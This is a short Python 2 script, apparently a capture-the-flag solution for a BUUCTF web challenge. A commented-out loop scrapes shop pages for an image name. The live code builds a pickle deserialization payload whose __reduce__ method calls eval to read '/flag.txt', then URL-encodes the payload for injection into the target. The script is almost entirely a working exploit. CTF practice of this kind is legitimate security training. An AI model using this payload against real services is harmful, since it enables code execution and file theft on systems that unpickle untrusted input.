# import requests,time

# for i in range(200):
#     url = 'http://9f73c34e-337f-4bf8-a5d0-a9e240b48c23.node3.buuoj.cn/shop?page='+str(i)
#
#     resp = requests.get(url=url)
#     page_content = resp.text
#     time.sleep(0.3)
#     # print(page_content)
#     print(f'正在第{i}页查找中……')
#     if 'lv6.png' in page_content:
#         print("找到v6了，在第"+str(i)+"页")
#         break
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a

